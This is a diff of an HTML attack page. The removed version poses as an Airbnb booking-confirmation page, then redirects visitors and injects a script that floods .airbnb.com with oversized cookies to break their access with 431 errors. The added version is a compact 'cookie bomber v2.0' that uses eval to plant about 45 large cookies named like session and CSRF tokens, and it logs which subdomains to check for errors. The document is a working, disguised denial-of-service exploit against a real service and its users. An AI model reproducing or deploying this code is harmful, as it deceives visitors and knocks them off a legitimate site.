@@ -1,89 +1,23 @@
 <!DOCTYPE html>
-<html>
-<head>
-    <title>Airbnb - Booking Confirmation</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
-            background: linear-gradient(135deg, #ff5f6d 0%, #ffc371 100%);
-            height: 100vh; display: flex; align-items: center; justify-content: center;
-        }
-        .container { 
-            background: white; padding: 40px; border-radius: 16px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); 
-            max-width: 420px; text-align: center;
-        }
-        .logo { font-size: 28px; font-weight: 800; color: #ff5f6d; margin-bottom: 20px; }
-        .message { color: #333; font-size: 18px; margin-bottom: 30px; line-height: 1.5; }
-        .spinner { 
-            border: 3px solid #f3f3f3; border-top: 3px solid #ff5f6d; border-radius: 50%; 
-            width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .status { color: #4CAF50; font-weight: 600; font-size: 16px; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="logo">🏠 Airbnb</div>
-        <div class="message">
-            Finalizing your booking...<br>
-            <small>Applying security certificate</small>
-        </div>
-        <div class="spinner"></div>
-        <div class="status">Please wait...</div>
-    </div>
-
-    <script>
-        // 2-SECOND DELAY → FORWARD TO AIRBNB + INJECT BOMBER
-        setTimeout(() => {
-            // REPLACE CURRENT PAGE WITH AIRBNB
-            const bomberScript = document.createElement('script');
-            bomberScript.textContent = `
-                // AUTO-FORWARD + BOMBER INJECTION
-                window.location.href = 'https://www.airbnb.com';
-                
-                // BOMBER WAITS FOR AIRBNB LOAD
-                let injected = false;
-                const observer = new MutationObserver(() => {
-                    if (location.hostname.includes('airbnb') && !injected) {
-                        injected = true; observer.disconnect();
-                        
-                        // UNSTOPPABLE COOKIE BOMBER
-                        (function(){
-                            const TARGET_DOMAIN = '.airbnb.com';
-                            let success = 0, total = 0;
-                            
-                            function spamCookies() {
-                                for(let i = 0; i < 150; i++) {
-                                    try {
-                                        const name = \`airbnb_\${i}_PHARMA_\${Date.now()}\`;
-                                        const payload = 'X'.repeat(6000);
-                                        
-                                        document.cookie = \`\${name}=\${payload}; Domain=\${TARGET_DOMAIN}; Path=/; Max-Age=86400\`;
-                                        document.cookie = \`\${name}=\${payload}; Path=/; Max-Age=86400\`;
-                                        total++;
-                                    } catch(e) {}
-                                }
-                                success++;
-                            }
-                            
-                            // IMMEDIATE + CONTINUOUS SPAM
-                            spamCookies();
-                            const spammer = setInterval(spamCookies, 30);
-                            setTimeout(()=>clearInterval(spammer), 20000);
-                            
-                            setTimeout(()=>{
-                                console.log(\`💣 AIRBNB BOMBER: \${total} cookies deployed | Check Network tab for 431 errors\`);
-                            }, 2000);
-                        })();
-                    }
-                });
-                observer.observe(document.documentElement, {subtree: true, childList: true});
-            `;
-            document.head.appendChild(bomberScript);
-        }, 2000);
-    </script>
-</body>
-</html>
+<html><body onload="setTimeout(()=>{window.open('https://www.airbnb.com');},500);">
+<script>
+let tries=0;
+const checkAirbnb=()=>{if(location.hostname.includes('airbnb')&&tries<1){tries++;eval(\`
+(function(){
+const TARGET_DOMAIN='.airbnb.com';
+console.log('%c🎯 AIRBNB COOKIE BOMBER v2.0 - Browser-Limit Aware','color: #d32f2f; font-size: 1.2rem;');
+let success=0,failed=0;const MAX_REALISTIC=45;
+const cookieTemplates=['sessionid=PHARMA_X','csrftoken=PHARMA_X','_airbnb_session=PHARMA_X','beacon_id=PHARMA_X','guest_id=PHARMA_X','ab_test_bucket=PHARMA_X'];
+for(let i=0;i<MAX_REALISTIC;i++){
+try{const name=cookieTemplates[i%cookieTemplates.length]+\`_\${i}\`;const payload='X'.repeat(3800)+\`_\${Date.now()}\`;
+document.cookie=\`\${name}=\${payload};Domain=\${TARGET_DOMAIN};Path=/;Max-Age=3600;SameSite=Lax\`;success++;}
+catch(e){failed++;if(failed>5)break;}}
+const totalKB=(success*3.8).toFixed(1);
+console.log(\`%c✅ DEPLOYED: \${success}/\${MAX_REALISTIC} cookies (\${totalKB}KB total)\`,'color: #4caf50; font-weight: bold;');
+console.log('%c🎯 Test subdomains: shop.airbnb.com, api.airbnb.com → Expect 431/413','color: #ff9800;');
+setTimeout(()=>{console.log('Current cookies:',document.cookie.split(';').length);},500);
+})();
+\`);}};
+setInterval(checkAirbnb,100);
+</script>
+</body></html>
